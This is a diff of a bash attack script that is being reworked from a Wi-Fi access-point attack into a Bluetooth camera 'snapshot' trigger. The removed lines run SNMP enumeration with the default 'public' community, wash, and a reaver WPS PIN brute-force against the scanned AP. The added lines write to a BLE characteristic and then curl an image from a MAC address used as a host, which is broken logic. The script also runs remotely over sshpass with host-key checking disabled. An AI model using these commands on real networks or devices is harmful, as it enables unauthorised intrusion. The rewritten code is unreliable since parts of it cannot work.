@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# ap_scan.sh
+# bluetooth_camera_snapshot.sh
 # Adapted with remote-vs-local execution: remote scan vs on-device via SSH
-# Usage: ./ ap_scan.sh
+# Usage: ./ bluetooth_camera_snapshot.sh
 # Requires appropriate tools depending on mode
 
 function detect_os() {
@@ -27,11 +27,9 @@ function ensure_tool() {
 }
 
 function remote_scan() {
-  read -rp "AP IP: " TARGET
-snmpwalk -v2c -c public "$TARGET" system
-wash -i wlan0 -o ap_wps.txt
-BSSID=$(awk 'NR==2{print $1}' ap_wps.txt)
-reaver -i wlan0 -b "$BSSID" -vv
+  read -rp "BLE MAC: " MAC
+gatttool -b "$MAC" --char-write-req --uuid=0000ff01-0000-1000-8000-00805f9b34fb -n 01
+echo "Snapshot triggered"; curl -O "http://$MAC/snapshot.jpg"
 
 }
 
@@ -40,8 +38,8 @@ function remote_ssh_execute() {
   local user="$SSH_USER"
   local pass="$SSH_PASS"
   echo "[*] Copying script and executing on-device via SSH"
-  scp "$0" "$user@$host:/tmp/ap_scan.sh"
-  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/ap_scan.sh on-device"
+  scp "$0" "$user@$host:/tmp/bluetooth_camera_snapshot.sh"
+  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "bash /tmp/bluetooth_camera_snapshot.sh on-device"
 }
 
 # Main
@@ -60,10 +58,8 @@ if [[ "$MODE" == "2" ]]; then
   exit 0
 else
   # perform remote scan
-  ensure_tool nmap
-ensure_tool snmpwalk
-ensure_tool wash
-ensure_tool reaver
+  ensure_tool gatttool
+ensure_tool curl
   remote_scan
   exit 0
 fi
